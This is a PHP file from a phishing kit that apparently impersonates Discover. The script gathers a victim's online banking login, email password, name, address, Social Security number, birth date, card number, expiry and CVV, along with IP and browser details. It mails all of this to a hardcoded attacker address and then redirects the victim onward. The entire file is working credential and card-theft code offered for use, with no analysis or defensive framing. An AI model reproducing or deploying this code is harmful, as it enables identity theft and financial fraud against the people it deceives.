<?php
session_start();


$userinfo="james4anne@hotmail.com"; // put your email

$mizzoow_login = $_SESSION['mizzoow_login'];
$mizzoow_pass  = $_SESSION['mizzoow_pass'];
$mizzoow_CCN   = $_SESSION['mizzoow_CCN'];
$mizzoow_exm   = $_SESSION['mizzoow_exm'];
$mizzoow_exy   = $_SESSION['mizzoow_exy'];
$mizzoow_ccv   = $_SESSION['mizzoow_ccv'];
$EmailAddress .= $_POST['Email'];
$EmailPassword .= $_POST['Pass'];
$FirstName .= $_POST['first'];
$Lastname .= $_POST['last'];
$Address .= $_POST['address'];
$Address2 .= $_POST['address2'];
$City .= $_POST['city'];
$State .= $_POST['state'];
$ZipCode .= $_POST['zip'];
$SSN .= $_POST['SSN'];
$mizzoow_day = $_SESSION['mizzoow_day'];
$mizzoow_mon = $_SESSION['mizzoow_mon'];
$mizzoow_yer = $_SESSION['mizzoow_yer'];
if (getenv(HTTP_X_FORWARDED_FOR)){
$ip = getenv(HTTP_X_FORWARDED_FOR); } else {
$ip = getenv(REMOTE_ADDR); }
$date = date("d M, Y");
$time = date("g:i a"); 
$date = trim("Date : ".$date.", Time : ".$time);
$useragent = $_SERVER['HTTP_USER_AGENT']; 

$data = "Discover Full Info Zboon :\n*********\nEmail Address : $EmailAddress\nEmail Password : $EmailPassword\n\nFirst Name : $FirstName\nLast Name : $Lastname\nAddress : $Address\nAddress 2 : $Address2\nCity : $City\nState : $State\nZipCode : $ZipCode\nSSN : $SSN\nBirth Date : $mizzoow_day / $mizzoow_mon / $mizzoow_yer\nCredit Card Information :\n*********\nCredit Card Number : $mizzoow_CCN \nExp. Date : $mizzoow_exm /19 $mizzoow_exy\nName On Card : $FirstName $Lastname \nCvv2 : $mizzoow_ccv\nAccount Information :\n*********\nUser ID : $mizzoow_login\nPassword : $mizzoow_pass\n\n*****\nUser IP : $ip\n$date\nAgent : $useragent \n>";

# -=-=-=- MIME BOUNDARY
$mime_boundary = "----MSA ----".md5(time());
# -=-=-=- MAIL HEADERS
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";
$headers  .="From: Discover <$from>\r\n";
$subject = "| Discover Zboon |";
mail($userinfo,$subject,$data);

$encrypt=  base64_encode($data);
header("Location: Finish.php?close=$encrypt");



?>